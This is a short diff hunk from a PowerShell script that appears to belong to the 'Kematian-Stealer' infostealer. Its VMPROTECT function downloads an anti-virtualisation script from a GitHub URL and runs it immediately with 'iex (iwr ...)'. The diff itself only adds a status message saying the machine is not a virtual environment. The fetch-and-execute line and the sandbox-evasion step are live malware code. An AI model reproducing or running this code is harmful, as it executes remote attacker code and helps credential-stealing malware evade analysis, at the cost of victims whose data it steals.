@@ -102,6 +102,7 @@ function Invoke-TASKS {
 function VMPROTECT {
     $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
     iex (iwr -uri $link -useb)
+    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
 }
 
 
